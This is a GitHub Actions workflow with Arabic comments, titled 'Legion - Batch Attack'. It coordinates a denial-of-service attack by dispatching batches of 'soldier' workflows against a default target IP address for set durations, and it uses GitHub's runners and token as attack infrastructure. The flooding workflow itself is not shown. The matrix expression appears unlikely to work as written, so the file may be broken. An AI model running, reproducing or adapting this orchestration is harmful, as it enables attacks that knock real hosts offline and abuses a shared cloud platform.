# اسم الـ Workflow: Legion - Batch Attack Strategy (v4)
name: Legion - Batch Attack (v4)

on:
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'عنوان IP الهدف'
        required: true
        default: '63.246.154.12'
      duration_per_batch:
        description: 'مدة الهجوم لكل دفعة (بالثواني)'
        required: true
        default: '300' # 5 دقائق لكل دفعة
      total_soldiers:
        description: 'إجمالي عدد الجنود المراد إطلاقه'
        required: true
        default: '150'
      batch_size:
        description: 'حجم الدفعة الواحدة (يجب أن يكون أقل من 20)'
        required: true
        default: '19'

jobs:
  # المهمة الرئيسية: قائد الفيلق الذي ينسق الدفعات
  legion_commander:
    runs-on: ubuntu-latest
    
    # استراتيجية المصفوفة لإنشاء الدفعات
    strategy:
      fail-fast: false
      matrix:
        # هذه المعادلة تقوم بإنشاء أرقام الدفعات
        # مثال: إذا كان الإجمالي 150 وحجم الدفعة 19، ستنشئ [0, 1, 2, 3, 4, 5, 6, 7]
        batch_number: ${{ fromJson(format('[{0}]', join(range(0, ceil(github.event.inputs.total_soldiers / github.event.inputs.batch_size)), ','))) }}

    steps:
      # الخطوة 1: تسجيل الدفعة الحالية
      - name: Announce Batch ${{ matrix.batch_number + 1 }}
        run: |
          echo "===== بدء الدفعة رقم: ${{ matrix.batch_number + 1 }} ====="
          echo "هذه الدفعة ستقوم بتشغيل ${{ github.event.inputs.batch_size }} جنديًا."

      # الخطوة 2: استدعاء Workflow الجنود (Soldier Workflow)
      # هذا يستدعي workflow آخر بشكل متزامن وينتظره حتى ينتهي
      - name: Dispatch Soldier Batch
        uses: benc-uk/workflow-dispatch@v1
        with:
          workflow: soldier.yml # اسم ملف workflow الجنود
          token: ${{ secrets.GITHUB_TOKEN }} # صلاحيات لتشغيل workflow آخر
          inputs: >
            {
              "target_ip": "${{ github.event.inputs.target_ip }}",
              "duration": "${{ github.event.inputs.duration_per_batch }}",
              "swarm_size": "${{ github.event.inputs.batch_size }}"
            }
